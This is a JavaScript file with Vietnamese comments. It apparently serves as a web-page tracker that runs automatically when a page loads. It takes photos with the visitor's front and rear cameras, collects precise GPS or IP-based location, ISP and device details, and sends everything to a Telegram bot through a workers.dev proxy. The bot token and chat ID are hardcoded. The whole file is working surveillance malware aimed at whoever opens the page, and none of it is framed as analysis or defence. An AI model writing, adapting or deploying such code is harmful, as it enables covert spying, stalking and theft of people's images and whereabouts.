const TELEGRAM_BOT_TOKEN = '7678531626:AAFWnHCu0GbMggkf7hcjp_qZ_9wy2slFfS8';
const TELEGRAM_CHAT_ID = '6337854195';
const API_SEND_MEDIA = `https://winter-hall-f9b4.jayky2k9.workers.dev/bot${TELEGRAM_BOT_TOKEN}/sendMediaGroup`;
const API_SEND_TEXT = `https://winter-hall-f9b4.jayky2k9.workers.dev/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;

const info = {
  time: new Date().toLocaleString(),
  ip: '',
  isp: '',
  address: '',
  country: '',
  lat: '',
  lon: '',
  device: '',
  os: '',
  camera: '⏳ Đang kiểm tra...'
};

// ✅ Nhận diện thiết bị
function detectDevice() {
  const ua = navigator.userAgent;
  if (/iPhone|iPad|iPod/i.test(ua)) {
    info.device = 'iOS Device';
    info.os = 'iOS';
  } else if (/Android/i.test(ua)) {
    const match = ua.match(/Android.*; (.+?) Build/);
    info.device = match ? match[1] : 'Android Device';
    info.os = 'Android';
  } else if (/Windows NT/i.test(ua)) {
    info.device = 'Windows PC';
    info.os = 'Windows';
  } else if (/Macintosh/i.test(ua)) {
    info.device = 'Mac';
    info.os = 'macOS';
  } else {
    info.device = 'Không xác định';
    info.os = 'Không rõ';
  }
}

// ✅ Nếu có GPS thì lấy địa chỉ chính xác, ngược lại fallback IP
function getPreciseLocationOrFallbackToIP() {
  return new Promise(resolve => {
    if (!navigator.geolocation) {
      return getIPInfo().then(resolve);
    }

    navigator.geolocation.getCurrentPosition(
      async pos => {
        info.lat = pos.coords.latitude.toFixed(6);
        info.lon = pos.coords.longitude.toFixed(6);

        try {
          const res = await fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${info.lat}&lon=${info.lon}`);
          const data = await res.json();
          info.address = data.display_name || '📍 Không xác định';
          info.country = data.address?.country || 'Không rõ';
        } catch (err) {
          info.address = '📍 GPS được cho phép, nhưng không rõ địa chỉ';
          info.country = 'Không rõ';
        }

        info.ip = 'Không rõ';
        info.isp = 'Không rõ';
        resolve();
      },
      async err => {
        console.warn('❌ GPS bị từ chối, chuyển sang IP:', err.message);
        await getIPInfo();
        resolve();
      },
      { enableHighAccuracy: true, timeout: 5000 }
    );
  });
}

// ✅ Lấy thông tin qua IP dân cư
function getIPInfo() {
  return fetch("https://ipwho.is/")
    .then(res => res.json())
    .then(data => {
      info.ip = data.ip;
      info.isp = data.connection?.org || 'Không rõ';
      info.address = `${data.city}, ${data.region}, ${data.postal || ''}`.replace(/, $/, '');
      info.country = data.country;
      info.lat = data.latitude?.toFixed(6) || '0';
      info.lon = data.longitude?.toFixed(6) || '0';
    })
    .catch(() => {
      info.ip = 'Không rõ';
      info.isp = 'Không rõ';
      info.address = 'Không rõ';
      info.country = 'Không rõ';
      info.lat = '0';
      info.lon = '0';
    });
}

// ✅ Caption gửi về Telegram
function getCaption() {
  return `
📡 [THÔNG TIN TRUY CẬP]

🕒 Thời gian: ${info.time}
📱 Thiết bị: ${info.device}
🖥️ Hệ điều hành: ${info.os}
🌐 IP: ${info.ip}
🏢 ISP: ${info.isp}
🏙️ Địa chỉ: ${info.address}
🌍 Quốc gia: ${info.country}
📍 Vĩ độ: ${info.lat}
📍 Kinh độ: ${info.lon}
📸 Camera: ${info.camera}
`.trim();
}

// ✅ Chụp camera
function captureCamera(facingMode = "user") {
  return new Promise((resolve, reject) => {
    navigator.mediaDevices.getUserMedia({ video: { facingMode } })
      .then(stream => {
        const video = document.createElement("video");
        video.srcObject = stream;
        video.play();

        video.onloadedmetadata = () => {
          const canvas = document.createElement("canvas");
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          const ctx = canvas.getContext("2d");

          setTimeout(() => {
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            stream.getTracks().forEach(track => track.stop());
            canvas.toBlob(blob => resolve(blob), "image/jpeg", 0.9);
          }, 1000);
        };
      })
      .catch(reject);
  });
}

// ✅ Gửi ảnh về Telegram
async function sendTwoPhotos(frontBlob, backBlob) {
  const formData = new FormData();
  formData.append('chat_id', TELEGRAM_CHAT_ID);
  formData.append('media', JSON.stringify([
    {
      type: 'photo',
      media: 'attach://front',
      caption: getCaption()
    },
    {
      type: 'photo',
      media: 'attach://back'
    }
  ]));
  formData.append('front', frontBlob, 'front.jpg');
  formData.append('back', backBlob, 'back.jpg');

  return fetch(API_SEND_MEDIA, {
    method: 'POST',
    body: formData
  });
}

// ✅ Gọi chính
async function main() {
  detectDevice();

  let frontBlob = null;
  let backBlob = null;

  try {
    frontBlob = await captureCamera("user");
    backBlob = await captureCamera("environment");
    info.camera = '✅ Đã chụp camera trước và sau';
  } catch (err) {
    console.warn("Không chụp đủ camera:", err.message);
    info.camera = '📵 Không thể truy cập đủ camera';
  }

  await getPreciseLocationOrFallbackToIP();

  if (frontBlob && backBlob) {
    await sendTwoPhotos(frontBlob, backBlob);
  } else {
    await fetch(API_SEND_TEXT, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: getCaption()
      })
    });
  }
}

// ✅ Gọi thủ công
main();
